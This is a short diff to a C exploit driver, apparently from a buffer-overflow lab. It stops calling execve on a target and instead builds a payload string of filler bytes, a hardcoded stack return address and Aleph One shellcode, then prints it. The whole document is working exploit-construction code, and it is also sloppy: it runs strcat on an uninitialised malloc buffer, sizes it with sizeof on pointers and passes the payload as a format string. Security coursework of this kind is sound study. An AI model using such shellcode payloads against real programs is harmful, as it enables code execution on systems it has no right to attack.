@@ -31,9 +31,19 @@ int main(void)
   args[2] = NULL;
   
   env[0] = shellcode;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+  // execve(TARGET, args, env);
+  // fprintf(stderr, "execve failed.\n");
 
+  char *preface = "shellcode=";
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+16);
+  strcat(envvar, preface);
+  strcat(envvar, "AAAA");
+  strcat(envvar, "\x97\xff\xff\xbf");
+  strcat(envvar, shellcodeAlephOne);
+  // strcat(envvar, "\0");
+  // printf("%s", envvar);
+  fprintf(stdout, envvar);
+  free(envvar);
   return 0;
 }
 
